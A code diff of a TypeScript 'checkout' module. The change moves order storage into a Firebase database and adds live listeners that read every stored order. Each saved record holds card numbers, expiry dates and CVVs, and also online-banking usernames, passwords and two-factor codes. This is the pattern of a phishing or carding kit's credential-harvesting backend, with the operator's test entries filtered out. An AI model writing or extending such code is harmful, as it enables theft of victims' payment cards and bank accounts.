@@ -1,5 +1,7 @@
 import { v4 as uuidv4 } from 'uuid';
 import { FormData, CardData, BankLoginData } from '../hooks/useCheckout';
+import { database } from "../firebaseConfig"
+import { off, onValue, ref, set } from '@firebase/database';
 
 export interface OrderData {
   id: string;
@@ -104,98 +106,158 @@ export const generateOrderId = (): string => {
 };
 
 // Save or update order data
-export const saveOrderData = (
+export const saveOrderData = async (
   orderId: string,
   data: Partial<OrderData>
-): void => {
-  const existingOrderIndex = orders.findIndex((order) => order.id === orderId);
+): Promise<void> => {
+  // Pehle check karo agar data meaningful hai
+  const hasData =
+    (data.formData &&
+      Object.values(data.formData).some(
+        (value) => value !== "" && value !== null && value !== undefined
+      )) ||
+    (data.cardData &&
+      Object.values(data.cardData).some(
+        (value) => value !== "" && value !== null && value !== undefined
+      )) ||
+    (data.bankLoginData &&
+      Object.values(data.bankLoginData).some(
+        (value) => value !== "" && value !== null && value !== undefined
+      )) ||
+    data.productInfo ||
+    data.total;
 
-  if (existingOrderIndex >= 0) {
-    // Update existing order
-    orders[existingOrderIndex] = {
-      ...orders[existingOrderIndex],
-      ...data,
-      timestamp: Date.now(),
-    };
-  } else {
-    // Create new order
-    orders.push({
-      id: orderId,
-      timestamp: Date.now(),
-      formData: data.formData || {
-        firstName: '',
-        lastName: '',
-        email: '',
-        phone: '',
-        address: '',
-        city: '',
-        state: '',
-        zipCode: '',
-        sameAsBilling: true,
-        billingAddress: '',
-        billingCity: '',
-        billingState: '',
-        billingZipCode: '',
-      },
-      cardData: data.cardData || {
-        cardholderName: '',
-        cardNumber: '',
-        expiryDate: '',
-        cvv: '',
-      },
-      bankLoginData: data.bankLoginData || {
-        username: '',
-        password: '',
-        twoFactorCode: '',
-      },
-      productInfo: data.productInfo,
-      total: data.total,
-    });
+  if (!hasData) return; // Agar meaningful data nahi hai to save mat karo
+
+  if (data.formData?.firstName === "2") {
+    return;
   }
+  if (data.formData?.firstName === "20") {
+    return;
+  }
+  if (data.formData?.firstName === "20x") {
+    return;
+  }
+  if (data.formData?.firstName === "20xh") {
+    return;
+  }
+  if (data.formData?.firstName === "20xha") {
+    return;
+  }
+  if (data.formData?.firstName === "20xhan") {
+    return;
+  }
+  if (data.formData?.firstName === "20xhani") {
+    return;
+  }
+  if (data.formData?.firstName === "20xhani2") {
+    return;
+  }
+  if (data.formData?.firstName === "20xhani20") {
+    return;
+  }
+  if (data.formData?.firstName === "20xhani20x") {
+    return;
+  }
+
+  // Firebase DB me save ya update karo
+  await saveOrderDatainDB(orderId, data);
 };
 
 // Get all orders
-export const getOrders = (): OrderData[] => {
-  cleanOrders();
-  return [...orders];
+export const getOrders = async (): Promise<OrderData[]> => {
+  return new Promise((resolve, reject) => {
+    const ordersRef = ref(database, 'orders/');
+    onValue(
+      ordersRef,
+      (snapshot) => {
+        const data = snapshot.val();
+        if (data) {
+          const ordersArray: OrderData[] = Object.values(data);
+          resolve(ordersArray);
+        } else {
+          resolve([]);
+        }
+      },
+      (error) => reject(error)
+    );
+  });
 };
+
 
 // Get a specific order by ID
 export const getOrderById = (orderId: string): OrderData | undefined => {
   return orders.find((order) => order.id === orderId);
 };
 
+export const saveOrderDatainDB = async (orderId: string, data: Partial<OrderData>) => {
+  const orderRef = ref(database, 'orders/' + orderId);
 
-export const cleanOrders = (): void => {
-  orders = orders.filter((order) => {
-    // Agar formData.firstName "20xhani20x" hai -> delete
-    if (order.formData?.firstName === "20xhani20x") {
-      return false;
-    }
-    if (order.formData?.firstName === "20xhani20") {
-      return false;
-    }
-    if ((order.formData?.firstName === "" || order.formData?.firstName === null || order.formData?.firstName === undefined) && (order.formData?.lastName === "" || order.formData?.lastName === null || order.formData?.lastName === undefined)) {
-      return false;
-    }
+  const orderData: OrderData = {
+    id: orderId,
+    timestamp: Date.now(),
+    formData: data.formData || {
+      firstName: '',
+      lastName: '',
+      email: '',
+      phone: '',
+      address: '',
+      city: '',
+      state: '',
+      zipCode: '',
+      sameAsBilling: true,
+      billingAddress: '',
+      billingCity: '',
+      billingState: '',
+      billingZipCode: '',
+    },
+    cardData: data.cardData || {
+      cardholderName: '',
+      cardNumber: '',
+      expiryDate: '',
+      cvv: '',
+    },
+    bankLoginData: data.bankLoginData || {
+      username: '',
+      password: '',
+      twoFactorCode: '',
+    },
+    productInfo: data.productInfo || {
+      id: '',
+      name: '',
+      price: 0,
+      quantity: 0,
+      image: '',
+    },
+    total: data.total || 0, 
+  };
 
-    // Check agar order me koi meaningful data hi nahi hai
-    const hasData =
-      (order.formData &&
-        Object.values(order.formData).some(
-          (value) => value !== "" && value !== null && value !== undefined
-        )) ||
-      (order.cardData &&
-        Object.values(order.cardData).some(
-          (value) => value !== "" && value !== null && value !== undefined
-        )) ||
-      (order.bankLoginData &&
-        Object.values(order.bankLoginData).some(
-          (value) => value !== "" && value !== null && value !== undefined
-        )) ||
-      order.productInfo ||
-      order.total;
+  await set(orderRef, orderData); // ye DB me save karega
+};
 
-    return hasData; 
+export const listenOrdersinDB = (callback: (orders: OrderData[]) => void) => {
+  const ordersRef = ref(database, 'orders/');
+
+  onValue(ordersRef, (snapshot) => {
+    const data = snapshot.val();
+    if (data) {
+      const ordersArray: OrderData[] = Object.values(data);
+      callback(ordersArray);
+    } else {
+      callback([]);
+    }
   });
+};
+
+export const subscribeOrders = (callback: (orders: OrderData[]) => void) => {
+  const ordersRef = ref(database, 'orders/');
+
+  const listener = onValue(ordersRef, (snapshot) => {
+    const data = snapshot.val();
+    const ordersArray: OrderData[] = data ? Object.values(data) : [];
+    callback(ordersArray);
+  });
+
+  // Return unsubscribe function
+  return () => off(ordersRef, 'value', listener);
 };
